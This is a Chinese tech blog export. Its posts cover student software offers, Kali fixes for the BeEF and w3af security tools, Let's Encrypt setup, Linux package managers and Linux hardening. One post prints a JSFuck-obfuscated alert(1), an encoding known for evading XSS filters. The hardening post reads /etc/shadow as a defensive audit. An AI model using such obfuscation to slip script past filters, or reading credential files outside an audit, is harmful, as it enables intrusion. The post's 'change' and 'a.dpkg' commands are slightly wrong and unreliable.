    <content><![CDATA[<h2 id="JetBrains"><a href="#JetBrains" class="headerlink" title="JetBrains"></a><a href="https://www.jetbrains.com/">JetBrains</a></h2><p>JetBrains是捷克的一家软件公司，该公司专业生产各种编程语言的IDE，其中包括Java的IDE —— <a href="https://www.jetbrains.com/idea/">Intellij IDEA</a>，Python的IDE —— <a href="https://www.jetbrains.com/pycharm/">PyCharm</a>，JavaScript的IDE —— <a href="https://www.jetbrains.com/webstorm/">WebStorm</a>，C/C++的IDE —— <a href="https://www.jetbrains.com/clion/">CLion</a>等等。JetBrains系列的IDE一直以强大易用著称，甚至有人说，一个优秀的程序员应该使用JetBrains全家桶。<br>JetBrains的大多数IDE都是收费的，有的分为社区版（Community Edition）和专业版（Professional Edition）两种，专业版相比社区版有更多的功能，但也会收取相应的费用，然而，JetBrains对学生提供<a href="https://www.jetbrains.com/zh/student/">免费授权计划</a>，学生只要验证学生身份即可免费使用JetBrains的所有IDE。</p>
<a id="more"></a>
<h2 id="Microsoft-Imagine"><a href="#Microsoft-Imagine" class="headerlink" title="Microsoft Imagine"></a><a href="https://imagine.microsoft.com/zh-CN">Microsoft Imagine</a></h2><p>Microsoft Imagine原名为DreamSpark，是微软为学生提供的一个资源集合，它包括了一些<a href="https://imagine.microsoft.com/zh-cn/catalog">软件和服务</a>，学生只要验证学生身份即可使用其中的工具。<br>个人认为，Imagine相比之前的DreamSpark，为学生提供的免费资源少了许多。具体而言，它提供如下资源：</p>
<ul>
<li>Parallels Desktop for Mac Pro Edition：macOS上最好的虚拟机产品，提供免费试用3个月</li>
<li>Visual Studio Community 2017：原本就是免费的</li>
<li>面向学生的 Microsoft Azure 入门版</li>
<li>Microsoft虚拟学院课程：原本就是免费的</li>
<li>Pluralsight</li>
<li>SQL Server 2017 Developer Edition</li>
<li>Visual Studio Code：微软推出的编辑器，原本就是开源免费的</li>
<li>Visual Studio for Mac：原本就是免费的</li>
<li>Windows Embedded 8.1 Industry Pro Update</li>
<li>Windows Server 2016</li>
<li>Windows应用商店免费开发人员帐户</li>
<li>WintellectNow</li>
<li>Xamarin Studio Community Edition：原本就是免费的</li>
<li>Visual Studio的PHP Tools插件</li>
</ul>
<h2 id="GitHub-Student-Developer-Pack"><a href="#GitHub-Student-Developer-Pack" class="headerlink" title="GitHub Student Developer Pack"></a><a href="https://education.github.com/pack">GitHub Student Developer Pack</a></h2><p>GitHub学生开发者包（GitHub Student Developer Pack）是GitHub与其他公司一起创建的，旨在让学生从一个地方免费访问最好的开发者工具，这样他们就可以边做边学。其中包括的工具有：</p>
<ul>
<li>Algolia</li>
<li>Atom：GitHub推出的编辑器，原本就是开源免费的</li>
<li>AWS</li>
<li>Bitnami</li>
<li>CARTO</li>
<li>CrowdFlower</li>
<li>Datadog</li>
<li>DigitalOcean：美国一家VPS提供商，提供50美元优惠劵</li>
<li>Flatiron School</li>
<li>GitHub无限制的私人仓库：值得注意的是，2019年1月8号之后，GitHub宣布私人仓库也可以免费使用了，在此之前，私人仓库是要收费的。</li>
<li>Gitkraken：跨平台的Git GUI客户端，提供免费一年的专业帐户</li>
<li>HackHands</li>
<li>Heroku：美国的一家PaaS厂商，提供一个长达2年的Hobby类型Dyno，Dyno是Heroku上所有应用程序的基本运行环境，Hobby类型的Dyno比免费的要稍微好一些，详细配置信息请参考<a href="https://devcenter.heroku.com/articles/dyno-types">官方文档</a></li>
<li>JetBrains系列IDE</li>
<li>Namecheap：美国的一家域名注册商，提供免费一年SSL证书、一年<code>.me</code>后缀域名优惠</li>
<li>SendGrid</li>
<li>Sentry</li>
<li>Stripe</li>
<li>Taplytics</li>
<li>Thinkful</li>
<li>Transifex</li>
<li>Travis CI：一个流行的持续集成平台，针对开源项目免费，此学生包提供私有项目免费使用。</li>
<li>Unreal Engine</li>
</ul>
<p>学生只要验证学生身份就可以使用GitHub学生开发者包中提供的工具。</p>
<h2 id="阿里云云翼计划"><a href="#阿里云云翼计划" class="headerlink" title="阿里云云翼计划"></a><a href="https://promotion.aliyun.com/ntms/act/campus2018.html">阿里云云翼计划</a></h2><p>学生验证学生身份后，每月仅需9.9元即可租用一台阿里云服务器。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>JSFuck</title>
    <url>/2018/08/10/jsfuck/</url>
    <content><![CDATA[<p>JSFuck是一种JavaScript的编码方式，它的命名起源于Brainfuck，同样，为了避讳脏话，它又被写作JSF*ck，以JSFuck风格写出的代码不需要另外的编译器或解释器执行，原生的JavaScript解释器即可直接运行。<br>JSFuck种共使用<code>[</code>、<code>]</code>、<code>(</code>、<code>)</code>、<code>!</code>、<code>+</code>这<strong>6</strong>种字符。<code>alert(1)</code>这段JavaScript代码用JSFuck风格表示如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure>
<p>要将任意的JavaScript代码编码为JSFuck风格，可前往<a href="http://www.jsfuck.com/">JSFuck</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Jupyter Notebook 常用扩展</title>
    <url>/2018/09/25/jupyter-notebook-extensions/</url>
    <content><![CDATA[<h2 id="扩展机制"><a href="#扩展机制" class="headerlink" title="扩展机制"></a>扩展机制</h2><p>在介绍常用扩展之前，有必要先来介绍一下 Jupyter Notebook 的扩展机制：本质上来说，所有的 Jupyter Notebook 扩展都是一个个的 Python 包，所以大部分可以通过 <code>pip</code> 快速安装，另外，Jupyter Notebook 是一个典型的 <strong>B/S</strong> 架构的应用，用户通过访问浏览器来使用 Jupyter Notebook，因此，Jupyter Notebook 的扩展可以只针对服务器端，也可以针对前端资源页面，而如果一个扩展增强了 Jupyter Notebook 的前端资源页面，则它还必须使用如下命令安装资源：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">jupyter nbextension install helpful_package --py <span class="comment"># or --sys-prefix if using virtualenv or conda</span></span><br></pre></td></tr></table></figure>

<p>安装完资源后，如果这个资源需要在每次 Jupyter Notebook 启动后被加载，则还应使用如下命令启用资源：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">jupyter nbextension <span class="built_in">enable</span> helpful_package --py <span class="comment"># or --sys-prefix if using virtualenv or conda</span></span><br></pre></td></tr></table></figure>

<h2 id="jupyter-contrib-nbextensions"><a href="#jupyter-contrib-nbextensions" class="headerlink" title="jupyter_contrib_nbextensions"></a><a href="https://github.com/ipython-contrib/jupyter_contrib_nbextensions">jupyter_contrib_nbextensions</a></h2><p>与其说这是一个扩展，倒不如说这是<strong>一群</strong>扩展，该扩展集合了大多数的 Jupyter Notebook 常用扩展。</p>
<p>使用 <code>pip install jupyter_contrib_nbextensions</code> 命令即可安装，安装完成后使用 <code>jupyter contrib nbextension install --user</code> 命令进行些许配置，参数 <code>--user</code> 指定安装到当前用户家目录下的 <code>.jupyter</code> 文件夹下。</p>
<p>等到安装并配置完成后，打开 Jupyter Notebook 网页，会出现 <code>Nbextensions</code> 选项卡，点击进入此选项卡中，可以启用或禁用相应的扩展。</p>
<h2 id="RISE"><a href="#RISE" class="headerlink" title="RISE"></a><a href="https://github.com/damianavila/RISE">RISE</a></h2><p>该扩展可以将 Jupyter Notebook 中的一个个单元格转换为一张张的幻灯片。</p>
<p>使用 <code>pip install RISE</code> 命令即可安装，安装完成后使用 <code>jupyter-nbextension install rise --py --sys-prefix</code> 命令安装前端资源，接着使用 <code>jupyter-nbextension enable rise --py --sys-prefix</code> 命令启用前端资源。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Kali Rolling 2017中无法登录BeEF的解决方案</title>
    <url>/2018/02/08/kali-beef-bug/</url>
    <content><![CDATA[<p>在Kali Rolling 2017中打开BeEF然后自动跳转到登录页面，会发现只有BeEF的图标而没有登录框，无法进行登录，经查是因为和Metasploit的集成有关的，解决方案如下：<br>将/usr/share/beef-xss/extensions/admin_ui/api/handler.rb文件中第22行的</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">minified = Uglifier.compile(evaluated)</span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">minified = evaluated</span><br></pre></td></tr></table></figure>
<p>保存并重启BeEF即可。</p>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali持久加密USB安装所遇问题总结</title>
    <url>/2017/12/04/kali-live-usb-bug/</url>
    <content><![CDATA[<h2 id="Writing-superblocks-and-filesystem-accounting-information"><a href="#Writing-superblocks-and-filesystem-accounting-information" class="headerlink" title="Writing superblocks and filesystem accounting information"></a>Writing superblocks and filesystem accounting information</h2><p>今天在将Kali安装到U盘上时遇到了上面所示的问题，也可以翻译成“写入超级块和文件系统账户统计信息”，具体情况是当使用<code>mkfs.ext4</code>格式化加密分区时，程序运行到上面所示的地方停止不动，无论等多久都无法完成，其间还会发生U盘挂掉又重连上的情况，使用<code>dmesg</code>命令诊断故障时发现如下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">device descriptor <span class="built_in">read</span>/8, error -110</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>经判断是因为主板无法提供给U盘足够的电量所导致的，因为我的U盘和虚拟机之间是3.0连接的，3.0连接要比2.0连接耗电，所以将U盘和虚拟机之间的连接改为2.0即可解决这个问题。</p>
<h2 id="时间问题"><a href="#时间问题" class="headerlink" title="时间问题"></a>时间问题</h2><p>安装好Kali并启动之后，会发现Kali的系统时间始终无法和Windows的系统时间保持一致，具体表现如下：</p>
<blockquote>
<p>开始时，Windows系统时间准确，启动Kali之后，Kali系统时间错误，将其更新正确之后，关闭Kali，进入Windows，发现Windows系统时间又错误。</p>
</blockquote>
<p>出现这种情况的原因是Windows和Linux的时间机制不一样，具体而言，Windows的时间就是硬件BIOS的时间，而Linux的时间则是硬件BIOS加上所在时区的时间。解决方法是，在Kali中执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo timedatectl set-local-rtc 1 --adjust-system-clock</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Rolling 2017更新后无法启动解决方案</title>
    <url>/2017/11/25/kali-update-bug/</url>
    <content><![CDATA[<h2 id="BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash"><a href="#BusyBox-v1-27-2-Debian-1-1-27-2-1-built-in-shell-ash" class="headerlink" title="BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)"></a>BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</h2><p>有时更新Kali后重新启动会出现如下显示，并无法进入系统界面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)</span><br><span class="line">Enter <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a list of built-in commands.</span><br><span class="line"></span><br><span class="line">(initramfs)</span><br></pre></td></tr></table></figure>
<p><strong>解决方法：</strong></p>
<ol>
<li>在此界面输入<code>blkid</code>命令，查看自己的分区号</li>
<li>依据自己的分区号输入<code>fsck -y /dev/sda1</code>，我的分区号是sda1。</li>
<li>输入<code>exit</code>命令退出重启电脑</li>
</ol>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Rolling 2017下安装w3af出错解决方案</title>
    <url>/2017/11/08/kali-w3af-bug/</url>
    <content><![CDATA[<h2 id="Run-error-quot-39-module-39-object-has-no-attribute-39-SSL-ST-INIT-39-quot-quot"><a href="#Run-error-quot-39-module-39-object-has-no-attribute-39-SSL-ST-INIT-39-quot-quot" class="headerlink" title="Run error: &quot;&#39;module&#39; object has no attribute &#39;SSL_ST_INIT&#39;&quot;.&quot;"></a>Run error: &quot;&#39;module&#39; object has no attribute &#39;SSL_ST_INIT&#39;&quot;.&quot;</h2><p><strong>解决方法1：</strong><br>修改/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py文件，将下面四行注释掉</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#SSL_ST_INIT = _lib.SSL_ST_INIT</span></span><br><span class="line"><span class="comment">#SSL_ST_BEFORE = _lib.SSL_ST_BEFORE</span></span><br><span class="line"><span class="comment">#SSL_ST_OK = _lib.SSL_ST_OK</span></span><br><span class="line"><span class="comment">#SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE</span></span><br></pre></td></tr></table></figure>
<p><strong>解决方法2：</strong></p>
<ol>
<li>卸载w3af要求的pyOpenSSL版本<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip uninstall pyOpenSSL</span><br></pre></td></tr></table></figure></li>
<li>安装最新版pyOpenSSL<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install pyOpenSSL</span><br></pre></td></tr></table></figure></li>
<li>编辑w3af安装目录中的/w3af/core/controllers/dependency_check/requirements.py文件，将要求的pyOpenSSl版本号改为你安装的最新版，即修改下面这一行代码<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PIPDependency(<span class="string">&#x27;OpenSSL&#x27;</span>, <span class="string">&#x27;pyOpenSSL&#x27;</span>, <span class="string">&#x27;Version of pyOpenSSL you are using&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<a id="more"></a>
<h2 id="error-command-39-x86-64-linux-gnu-g-39-failed-with-exit-status-1"><a href="#error-command-39-x86-64-linux-gnu-g-39-failed-with-exit-status-1" class="headerlink" title="error: command &#39;x86_64-linux-gnu-g++&#39; failed with exit status 1"></a>error: command &#39;x86_64-linux-gnu-g++&#39; failed with exit status 1</h2><p><strong>解决方法：</strong><br>使用如下命令安装相关依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt-get build-dep python-lxml</span><br><span class="line">$ apt-get install libxslt-dev libssl-dev</span><br></pre></td></tr></table></figure>

<h2 id="ImportError-No-module-named-webkit"><a href="#ImportError-No-module-named-webkit" class="headerlink" title="ImportError: No module named webkit"></a>ImportError: No module named webkit</h2><p>启动GUI界面时可能会报此错误，原因是未安装相关模块<br><strong>解决方法：</strong><br>执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt-get install python-webkit python-webkit-dev</span><br></pre></td></tr></table></figure>
<p>在Kali下，因为python-webkit，python-webkit-dev不在Kali默认的源中，所以需要执行下面的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://ftp.cn.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb</span><br><span class="line">$ dpkg -i python-support_1.0.15_all.deb</span><br><span class="line">$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb</span><br><span class="line">$ dpkg -i python-webkit_1.1.8-3_amd64.deb</span><br><span class="line">$ apt install python-gtk2-dev</span><br><span class="line">$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit-dev_1.1.8-3_all.deb</span><br><span class="line">$ dpkg -i python-webkit-dev_1.1.8-3_all.deb</span><br></pre></td></tr></table></figure>
<p>安装过程中可能需要安装相关依赖，可执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt --fix-broken install</span><br></pre></td></tr></table></figure>

<h2 id="ImportError-No-module-named-gtksourceview2"><a href="#ImportError-No-module-named-gtksourceview2" class="headerlink" title="ImportError: No module named gtksourceview2"></a>ImportError: No module named gtksourceview2</h2><p>同样，启动GUI时也可能报此错误<br><strong>解决方法：</strong><br>执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt-get install python-gtksourceview2</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>LaTeX小记</title>
    <url>/2018/09/12/latex/</url>
    <content><![CDATA[<h2 id="TeX与LaTeX"><a href="#TeX与LaTeX" class="headerlink" title="TeX与LaTeX"></a>TeX与LaTeX</h2><p><a href="https://www.tug.org/begin.html">TeX</a>是由<a href="https://zh.wikipedia.org/zh-cn/%E9%AB%98%E5%BE%B7%E7%BA%B3">Donald Knuth</a>开发的一个排版系统，特别适合处理复杂的数学公式等。之后，<a href="https://zh.wikipedia.org/zh-cn/%E8%8E%B1%E6%96%AF%E5%88%A9%C2%B7%E5%85%B0%E6%B3%A2%E7%89%B9">Leslie Lamport</a>改进了TeX，形成了<a href="https://www.latex-project.org/">LaTeX</a>(Lamport TeX)。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p><a href="https://www.mathjax.org/">MathJax</a>是一个JavaScript引擎，可以用来在网页上显示使用LaTeX语言书写的数学公式。<br><a href="https://www.codecogs.com/latex/eqneditor.php?lang=zh-cn">在线LaTeX公式编辑器</a>是一个将公式符号转化为LaTeX语言的网站，对于尚不熟悉的人书写LaTeX公式提供一点便利。<br><a href="https://cn.sharelatex.com/">ShareLaTeX</a>是一个在线的LaTeX编辑环境，同时也提供了足够多的LaTeX模板。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>使用Let&#39;s Encrypt获取免费SSL证书</title>
    <url>/2018/09/16/let-s-encrypt/</url>
    <content><![CDATA[<p><a href="https://letsencrypt.org/zh-cn/">Let&#39;s Encrypt</a>是一个免费、自动化和开放的证书颁发机构，它提供了一个工具：<a href="https://certbot.eff.org/">Certbot</a>，可以用来获取SSL证书。<br>进入Certbot的官网，根据自己的环境选择Web服务器和操作系统，即可得到详细的操作步骤，下面以Nginx Web服务器和CentOS 6操作系统为例，给出相关步骤：</p>
<a id="more"></a>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载certbot-auto脚本</span></span><br><span class="line">wget https://dl.eff.org/certbot-auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置相关权限</span></span><br><span class="line">chmod a+x certbot-auto</span><br></pre></td></tr></table></figure>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>请注意，获取或更新SSL证书之前需关闭相应的Web服务器，具体而言，需要执行<code>service nginx stop</code>。另外，第一次执行<code>certbot-auto</code>命令时，它会下载并安装相关环境，耐心等待即可。<br>Certbot提供了一个Nginx插件，直接使用<code>./certbot-auto --nginx</code>即可完成所有配置。<br>如果你想手动配置，可执行<code>./certbot-auto certonly --standalone</code>命令，此命令运行过程中会要求用户输入要获取SSl证书的域名，按要求输入即可，命令运行成功后会显示证书相关文件所在的目录。<br>接下来只需在Nginx的配置文件<code>nginx.conf</code>中进行如下配置即可(以howiezhao.com域名为例)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssl on;</span><br><span class="line">ssl_certificate /etc/letsencrypt/live/howiezhao.com/fullchain.pem;</span><br><span class="line">ssl_certificate_key /etc/letsencrypt/live/howiezhao.com/privkey.pem;</span><br></pre></td></tr></table></figure>
<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>Let&#39;s Encrypt的证书默认时间为90天，当到期后，需要使用<code>./certbot-auto renew</code>命令进行证书更新。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>要查看<code>certbot-auto</code>的更多命令，可以使用<code>certbot-auto --help all</code>命令查看之。要了解SSL的详细知识，可参考我之前写的笔记<a href="http://localhost:4000/2018/05/11/https/">HTTPS运行机制</a>。要了解Nginx的相关知识，可参考我之前写的笔记<a href="">利用Nginx进行反向代理</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>库与框架</title>
    <url>/2018/09/16/library-framework/</url>
    <content><![CDATA[<p>软件开发中经常会有人混淆库与框架的含义，下面简单介绍之：</p>
<p><strong>库</strong>（library）是一个工具集，它不告诉你应该怎么做事，它只告诉你它能干什么事，具体干什么事，取决于使用者，比如，<a href="https://jquery.com/">jQuery</a>、Servlet 等是一个个的库。</p>
<p>库的优点是自由度高，可定制性强，较适用于小项目。</p>
<p><strong>框架</strong>（framework）制定了一系列的规则，限定了你的行动，你必须遵循它制定的规则行事，但它却可以极大方便你的开发，比如，<a href="https://angular.io/">Angular</a>、<a href="https://spring.io/">Spring</a> 等是一个个的框架。</p>
<p>框架的优点是流程性高，便于开发，较适用于大项目。</p>
<p>通常，我们把库也称为<strong>类库</strong>（class library），这也从另一个方面反映了库中包含的主要是<strong>类</strong>，类似的，框架中也主要包含类，据此，我们可以把程序员分为<strong>类创建者</strong>和<strong>客户端程序员</strong>，客户端程序员通过调用其类来使用库或框架。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Linux的包管理机制</title>
    <url>/2018/05/09/linux-package/</url>
    <content><![CDATA[<p>不同Linux发行版的主要区别是其包管理机制不同，Linux发行版大致可以分为2个派别：一派以Red Hat为首，主要包括CentOS(社区版)、Fedora(桌面版)等；另一派以Debian为首，主要包括Ubuntu、Kali等。Red Hat系采用<code>rpm</code>为其包格式，<code>yum</code>为其包管理工具；Debian系采用<code>dpkg</code>为其包格式，<code>apt-get</code>为其包管理工具。</p>
<h2 id="rpm与yum"><a href="#rpm与yum" class="headerlink" title="rpm与yum"></a>rpm与yum</h2><p><code>rpm</code>全称Red-Hat Package Manager(RPM软件包管理器)，是Red Hat系中的包格式，同时也是其<strong>本地</strong>包管理工具，常用命令有：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -i a.rpm  <span class="comment">#安装a</span></span><br><span class="line">rpm -e a      <span class="comment">#卸载a</span></span><br></pre></td></tr></table></figure>
<p><code>yum</code>全称Yellow dog Updater, Modified(修改后的黄色狗更新器)，是Red Hat系中的包管理工具，常用命令有：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update     <span class="comment">#更新包列表</span></span><br><span class="line">yum upgrade    <span class="comment">#更新包</span></span><br><span class="line">yum install a  <span class="comment">#安装a</span></span><br><span class="line">yum remove a   <span class="comment">#卸载a</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="dpkg与apt-get"><a href="#dpkg与apt-get" class="headerlink" title="dpkg与apt-get"></a>dpkg与apt-get</h2><p><code>dpkg</code>全称Debian Packager(Debian包工具)，是Debian系中的包格式，同时也是其<strong>本地</strong>包管理工具，常用命令有：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -i a.dpkg  <span class="comment">#安装a</span></span><br><span class="line">dpkg -r a       <span class="comment">#卸载a</span></span><br></pre></td></tr></table></figure>
<p><code>apt-get</code>是apt中的一个子程序，apt全称Advanced Packaging Tool(先进的包工具)，是Debian系中的包管理工具，apt的程序包来源列表文件位于<code>/etc/apt/sources.list</code>，<code>apt-get</code>的常用命令有：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update     <span class="comment">#更新包列表</span></span><br><span class="line">sudo apt-get upgrade    <span class="comment">#更新包</span></span><br><span class="line">sudo apt-get install a  <span class="comment">#安装a</span></span><br><span class="line">sudo apt-get purge a    <span class="comment">#卸载a并删除其配置文件（即彻底删除），命令作用等同于apt-get --purge remove a</span></span><br></pre></td></tr></table></figure>
<p>同样的，<code>apt-cache</code>也是apt中的一个子程序，它的常用命令有：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-cache depends a  <span class="comment">#查看包a的依赖包</span></span><br></pre></td></tr></table></figure>
<p>值得注意的是，随着新版系统的到来，出现了更为强大的<code>apt</code>命令，可以简单认为<code>apt</code>集合了<code>apt-get</code>、<code>apt-cache</code>、<code>apt-config</code>中的最常用命令选项。例如，<code>apt install</code>相比<code>apt-get install</code>增加了色彩显示以及进度条显示等功能。因此，更建议使用<code>apt</code>命令，常用命令有：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update     <span class="comment">#更新包列表</span></span><br><span class="line">sudo apt upgrade    <span class="comment">#更新包</span></span><br><span class="line">sudo apt install a  <span class="comment">#安装a</span></span><br><span class="line">sudo apt purge a    <span class="comment">#卸载a并删除其配置文件（即彻底删除），命令作用等同于apt --purge remove a</span></span><br><span class="line">sudo apt list --installed  <span class="comment">#查看已安装的包</span></span><br></pre></td></tr></table></figure>
<p>关于Ubuntu中程序包的搜索可以使用<a href="https://packages.ubuntu.com/">Ubuntu Packages Search</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统加固</title>
    <url>/2018/05/19/linux-reinforcement/</url>
    <content><![CDATA[<h2 id="帐户与口令"><a href="#帐户与口令" class="headerlink" title="帐户与口令"></a>帐户与口令</h2><p>此方面的加固主要为了防止针对帐户的暴力破解。</p>
<p>禁用或删除无用帐户：<br>使用命令<code>userdel &lt;用户名&gt;</code>删除不必要的帐户，使用参数<code>-r</code>即可删除相应用户的家目录和邮箱目录。<br>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定不必要的帐户，解锁可使用<code>passwd -u &lt;用户名&gt;</code>。</p>
<p>检查特殊帐户：<br>使用命令<code>awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow</code>查看空口令帐户，若存在，则使用命令<code>passwd &lt;用户名&gt;</code>为空口令帐户设定密码。<br>使用命令<code>awk -F: &#39;($3==0)&#39; /etc/passwd</code>查看uid为0的帐户，确认uid为0的帐户只有root帐户。</p>
<p>添加口令策略：<br>使用命令<code>change -m 0 -M 30 -E 2020-01-01 -W 7 &lt;用户名&gt;</code>修改帐户口令策略，<code>-m</code>表示密码最小使用天数，<code>-M</code>表示密码最大使用天数，<code>-E</code>表示密码到期时间，<code>-W</code>表示密码到期前多少天提醒。或者可以直接编辑/etc/login.defs文件进行修改。</p>
<a id="more"></a>
<p>设置用户锁定：<br>在CentOS7中，编辑/etc/pam.d/system-auth文件，添加<code>auth required pam_tally2.so onerr=fail deny=6 unlock_time=300</code>此行，表示当密码连续输错6次后锁定，锁定时间300秒。<br>限制能su到root的用户：<br>编辑/etc/pam.d/su文件，添加<code>auth required pam_wheel.so group=test</code>此行，表示只允许test组用户su到root。</p>
<h2 id="服务安全"><a href="#服务安全" class="headerlink" title="服务安全"></a>服务安全</h2><p>服务越少，系统越安全。</p>
<p>关闭不必要的服务：<br>在CentOS中，使用命令<code>chkconfig --level &lt;init级别&gt; &lt;服务名&gt; on|off|reset</code>设置服务在指定init级别下开机是否启动。</p>
<p>SSH服务安全：<br>编辑/etc/ssh/sshd_config文件，修改默认端口，即<code>Port</code>项；禁止root用户远程登录，即<code>PermitRootLogin</code>项，应使用普通用户登录，特殊权限时使用<code>sudo</code>命令；禁止空密码登录，即<code>PermitEmptyPasswords</code>项；限制登录密码输错次数；最好使用密钥登录而不是密码登录，即<code>PasswordAuthentication</code>项值改为<code>no</code>。修改完后，需要使用<code>service sshd restart</code>重启SSH服务。</p>
